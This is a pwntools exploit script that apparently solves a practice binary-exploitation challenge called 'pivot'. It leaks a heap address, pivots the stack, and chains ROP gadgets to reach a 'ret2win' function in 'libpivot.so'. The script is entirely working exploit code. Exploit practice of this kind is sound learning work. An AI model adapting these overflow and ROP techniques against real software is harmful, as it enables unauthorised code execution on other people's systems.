#!/usr/bin/env python3
from pwn import *

context.terminal = ('kgx', '-e')
lib = ELF("./libpivot.so")
if args.GDB:
    p = gdb.debug("./pivot", """
        b *pwnme+182
        c
    """)
else:
    p = process("./pivot")
    
p.recvuntil("pivot: ")
heap_addr = int(p.recvline().strip(), 16)
print(heap_addr)

POP_RAX = 0x4009BB
GADGET_SWAP = 0x4009BD
GADGET_MOV = 0x4009C0
GADGET_ADD = 0x4009C4
POP_RDI = 0x400a33

PAYLOAD1 = b'a' * 32 + p64(lib.sym["ret2win"] - lib.sym["foothold_function"]) + p64(POP_RAX) + p64(heap_addr) + p64(GADGET_SWAP)
PAYLOAD2 = p64(POP_RDI) + p64(0x601058) + p64(0x4008C7) + p64(POP_RAX) + p64(0x601040) + p64(GADGET_MOV) + p64(GADGET_ADD) + p64(0x4006b0)
PAYLOAD3 = b'a' * 32 + p64(lib.sym["ret2win"] - lib.sym["foothold_function"]) + p64(0x4009A8)

p.recvuntil(b'> ')
p.sendline(PAYLOAD2)
p.recvuntil(b'> ')
p.send(PAYLOAD1)
p.recvuntil(b'> ')
p.send(p64(0x4009A6)) # call retn
p.recvuntil(b'> ')
p.send(PAYLOAD3)

p.interactive()